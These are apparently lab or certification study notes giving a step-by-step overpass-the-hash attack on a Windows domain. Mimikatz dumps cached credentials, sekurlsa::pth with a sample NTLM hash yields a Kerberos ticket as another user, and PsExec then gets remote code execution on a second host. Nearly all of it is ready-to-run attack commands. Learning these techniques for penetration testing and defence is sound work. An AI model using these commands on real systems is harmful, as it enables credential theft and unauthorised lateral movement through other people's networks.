Requirements:
- An authenticated RDP session on a machine on the network
- The target users cached hash must be present on the machine we have access to

On mimikatz:
```
privilege::debug
```
```
sekurlsa::logonpasswords
```

Run sekurlsa::pth to obtain the TGT from the hash:
- sekurlsa::pth /user:<span id="USER"/>jen<span type="end"/> /domain:<span id="DOMAIN"/>corp.com<span type="end"/> /ntlm:<span id="NTLM_HASH"/>369def79d8372408bf6e93364cc93075<span type="end"/> /run:powershell
- This will open up a new PS session that allows us to execute commands as USER

On new terminal:
- Generate TGT by authenticating to a network share:
```
net use \\files04
```
- List cached kerberos tickets:
```
klist
```
- The TGT has kerbtgt as the server while the TGS has cifs as the server

We can now use PsExec (which does not accept NTLM hashes) to perform remote code execution on a machine of our choosing:
- Change directorys to wher psexec is located
```
cd C:\tools\SysinternalsSuite\
```
```
.\PsExec.exe \\web04 cmd
```
- Check Identity
```
whoami
```
```
hostname
```
